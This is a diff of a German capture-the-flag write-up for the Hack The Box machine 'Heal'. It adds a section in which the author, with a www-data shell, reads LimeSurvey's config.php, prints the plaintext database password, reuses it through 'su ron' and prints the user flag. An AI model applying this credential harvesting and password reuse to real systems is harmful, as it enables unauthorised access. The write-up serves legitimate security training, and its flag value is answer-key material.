@@ -449,16 +449,164 @@ www-data@heal:/var/www/limesurvey$
 ```
 ![alt text](Screenshot_2025-04-19_20_30_08.png)
 
-PTY-Upgrade:
-```bash
-cd /tmp
-python3 -c 'import pty,os; pty.spawn("/bin/bash")'
-CTRL + Z
-stty raw -echo; fg
-export TERM=xterm
+Jetzt hatte ich eine voll funktionsfähige Shell als www-data auf der Maschine.
+
+## User Flag
+
+Nach dem Exploit über limesurvey hatte ich Zugriff als www-data.
+Ziel war es nun, auf einen lokalen Benutzer mit echten Rechten zu wechseln. inkl userflag holen.
+
+1. Web-Passwort war nicht systemweit gültig
+
+Zuerst versuchte ich das bereits gecrackte Web‑Passwort von ralph@heal.htb (147258369) für lokale Benutzer:
+
+su ralph     # → funktioniert nicht
+su ron       # → ebenfalls fehlgeschlagen
+
+Beide Logins gaben Authentication failure zurück.
+
+Das bestätigte, dass die gehashten Passwörter aus der Rails‑Datenbank nur für die Web‑App galten – nicht für Linux-Accounts.
+
+2. Datenbank‑Passwort holen
+
+Im Verzeichnis:
+
+`/var/www/limesurvey/application/config/`
+
+fand ich in der Datei config.php die Zugangsdaten für die PostgreSQL-Datenbank – inklusive Plaintext-Passwort:
+
+'username' => 'db_user',
+'password' => 'AdmiDi0_pA$$w0rd',
+
+Ganzer output: 
+```php
+www-data@heal:~/limesurvey/upload/plugins/lyfe691-exploit$ `cat /var/www/limesurvey/application/config/config.php`
+<t /var/www/limesurvey/application/config/config.php       
+<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
+/*
+| -------------------------------------------------------------------
+| DATABASE CONNECTIVITY SETTINGS
+| -------------------------------------------------------------------
+| This file will contain the settings needed to access your database.
+|
+| For complete instructions please consult the 'Database Connection'
+| page of the User Guide.
+|
+| -------------------------------------------------------------------
+| EXPLANATION OF VARIABLES
+| -------------------------------------------------------------------
+|
+|    'connectionString' Hostname, database, port and database type for 
+|     the connection. Driver example: mysql. Currently supported:
+|                 mysql, pgsql, mssql, sqlite, oci
+|    'username' The username used to connect to the database
+|    'password' The password used to connect to the database
+|    'tablePrefix' You can add an optional prefix, which will be added
+|                 to the table name when using the Active Record class
+|
+*/
+return array(
+        'components' => array(
+                'db' => array(
+                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
+                        'emulatePrepare' => true,
+                        'username' => 'db_user', 
+                        'password' => 'AdmiDi0_pA$$w0rd', <- pwd
+                        'charset' => 'utf8',
+                        'tablePrefix' => 'lime_',
+                ),
+
+                 'session' => array (
+                        'sessionName'=>'LS-ZNIDJBOXUNKXWTIP',
+                        // Uncomment the following lines if you need table-based sessions.
+                        // Note: Table-based sessions are currently not supported on MSSQL server.
+                        // 'class' => 'application.core.web.DbHttpSession',
+                        // 'connectionID' => 'db',
+                        // 'sessionTableName' => '{{sessions}}',
+                 ),
+
+                'urlManager' => array(
+                        'urlFormat' => 'path',
+                        'rules' => array(
+                                // You can add your own rules here
+                        ),
+                        'showScriptName' => true,
+                ),
+
+                // If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
+                //'request' => array(
+                //      'baseUrl' => '/limesurvey',
+                //),
+        ),
+        // For security issue : it's better to set runtimePath out of web access
+        // Directory must be readable and writable by the webuser
+        // 'runtimePath'=>'/var/limesurvey/runtime/'
+        // Use the following config variable to set modified optional settings copied from config-defaults.php
+        'config'=>array(
+        // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
+        // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
+        // on your webspace.
+        // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
+                'debug'=>0,
+                'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2
+
+                // If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
+                // public URL (the URL facing survey participants). You will also need to set the request->baseUrl in the section above.
+                //'publicurl' => 'https://www.example.org/limesurvey',
+
+                // Update default LimeSurvey config here
+        )
+);
+/* End of file config.php */
+/* Location: ./application/config/config.php */
 ```
 
-Jetzt hatte ich eine voll funktionsfähige Shell als www-data auf der Maschine.
+Da viele Systeme schwache Passwort‑Policies und Reuse verwenden, habe ich versucht, mich mit diesem Passwort als Benutzer ron einzuloggen.
+3. su auf ron
+```
+www-data@heal:~/limesurvey/upload/plugins/lyfe691-exploit$ su ron
+su ron                                                                                                                                                                                                                                      
+Password: AdmiDi0_pA$$w0rd                                                                                                                                                                                                                  
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+```
+
+War erfolgreich. 
+
+4. User-Flag 
+
+Nach dem Wechsel in rons home dings:
+
+```
+whoami
+ron
+cd
+chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+
+ls -la
+total 32
+drwxr-x--- 4 ron  ron  4096 Apr 19 05:31 .
+drwxr-xr-x 4 root root 4096 Dec  9 12:53 ..
+lrwxrwxrwx 1 root root    9 Dec  9 12:57 .bash_history -> /dev/null
+-rw-r--r-- 1 ron  ron   220 Dec  9 12:53 .bash_logout
+-rw-r--r-- 1 ron  ron  3771 Dec  9 12:53 .bashrc
+drwx------ 2 ron  ron  4096 Dec  9 15:13 .cache
+-rw-r--r-- 1 ron  ron   807 Dec  9 12:53 .profile
+drwx------ 2 ron  ron  4096 Apr 19 05:32 .ssh
+-rw-r----- 1 root ron    33 Apr 18 10:09 user.txt
+
+cat user.txt
+d18da46a08d09ab95187edcc99ae1188
+```
+
+![alt text](Screenshot_2025-04-19_21_38_25.png)
+
+wie man sehen kann ist das userflag: 
+
+`d18da46a08d09ab95187edcc99ae1188`
+
+HTB user flag owned:
+ 
+![alt text](Screenshot_2025-04-19_21_40_41.png)
 
 
 
